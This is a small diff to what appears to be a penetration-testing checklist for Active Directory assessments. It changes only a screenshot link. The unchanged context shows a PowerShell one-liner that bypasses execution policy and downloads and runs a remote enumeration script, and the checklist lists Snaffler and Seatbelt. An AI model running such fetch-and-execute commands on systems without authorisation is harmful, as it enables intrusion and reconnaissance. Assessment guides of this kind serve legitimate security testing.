@@ -35,7 +35,7 @@ For most assessments it makes sense to follow up enumeration on a provided devic
 powershell -ep bypass -c "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fkxdr/fkad/refs/heads/main/fkad.ps1')"
 ```
 
-<img width="1552" height="780" alt="image" src="https://github.com/user-attachments/assets/93368fa4-9348-4453-ba91-d7fcfe3236bf" />
+<img width="1664" height="896" alt="image" src="https://github.com/user-attachments/assets/ff381278-452e-4ddb-8d71-f50199a63777" />
 
 - [ ] Snaffler
 - [ ] Seatbelt
